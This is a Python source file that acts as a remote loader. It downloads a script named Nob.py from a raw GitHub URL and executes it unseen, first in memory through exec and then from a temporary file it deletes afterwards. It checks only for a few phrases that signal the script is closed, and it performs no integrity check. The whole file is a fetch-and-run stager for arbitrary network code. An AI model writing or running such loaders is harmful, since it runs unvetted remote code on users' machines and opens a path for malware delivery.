import sys,os,traceback,time,tempfile,runpy
from urllib.request import Request,urlopen
from urllib.error import URLError,HTTPError

RAW_URL="https://raw.githubusercontent.com/faresMshams/faresMshams/refs/heads/main/Nob.py"
BLOCK_PHRASES = ["return to dev", "script is closed", "press enter to close", "retru nto dev"]

def download_text(url,timeout=30):
    req=Request(url,headers={"User-Agent":"Mozilla/5.0"})
    with urlopen(req,timeout=timeout) as r:
        data=r.read()
        try: return data.decode("utf-8")
        except: return data.decode("latin-1")

def exec_in_memory(code_text,filename="<remote>"):
    globs={"__name__":"__main__","__file__":filename,"__package__":None,"__cached__":None}
    old_argv=sys.argv[:]
    try:
        sys.argv=[filename]+old_argv[1:]
        compiled=compile(code_text,filename,"exec")
        exec(compiled,globs)
    finally:
        sys.argv=old_argv

def exec_via_tempfile(code_text,suffix=".py"):
    tf=None
    try:
        tf=tempfile.NamedTemporaryFile(mode="w",suffix=suffix,delete=False,encoding="utf-8")
        tf.write(code_text); tf.flush(); tf.close()
        runpy.run_path(tf.name,run_name="__main__")
    finally:
        if tf is not None:
            try: os.remove(tf.name)
            except: pass

def main():
    try:
        code=download_text(RAW_URL)
    except Exception:
        sys.exit(1)
    low=code.lower()
    for p in BLOCK_PHRASES:
        if p in low:
            print(p)
            try: input()
            except: pass
            sys.exit(0)
    try:
        exec_in_memory(code,filename=RAW_URL)
        return
    except SystemExit as se:
        if isinstance(se.code,int) and se.code!=0: sys.exit(se.code)
        return
    except:
        traceback.print_exc()
    try:
        exec_via_tempfile(code)
    except SystemExit as se:
        if isinstance(se.code,int) and se.code!=0: sys.exit(se.code)
    except:
        traceback.print_exc(); sys.exit(1)

if __name__=="__main__":
    try: main()
    except KeyboardInterrupt: pass
